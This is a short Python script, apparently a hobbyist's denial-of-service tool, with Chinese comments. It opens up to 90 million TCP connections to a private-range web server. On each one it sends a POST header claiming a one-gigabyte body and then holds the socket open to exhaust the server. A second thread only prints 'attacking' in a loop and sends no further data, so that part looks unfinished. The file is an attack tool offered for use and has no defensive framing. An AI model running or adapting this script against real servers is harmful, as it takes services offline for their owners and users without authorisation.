# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : doss.py
# 时间    : 2022/10/9 18:59
# -----------------------------------------------------------------------------------
import socket
import time
import threading

max=90000000
port=80                 #端口
host="192.168.56.135"   #IP
page="/index.php"

bag=("POST %s HTTP/1.1\r\n"
    "host: %s\r\n"
    "Content-Length: 1000000000\r\n"
    "Cookie: 1998\r\n"
    "\r\n" % (page,host))

socks = []

def connect():
    global socks
    for i in range(0,max):
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect((host,port))
            s.send(bag.encode("utf-8"))
            socks.append(s)
        except Exception as ex:
            time.sleep(1)

def send():
    global socks
    while True:
        for s in socks:
            try:
                print("攻击中....")
            except Exception as ex:
                socks.remove(s)
                s.close()
        time.sleep(0.1)

One = threading.Thread(target=connect,args=())
Two = threading.Thread(target=send,args=())
One.start()
Two.start()
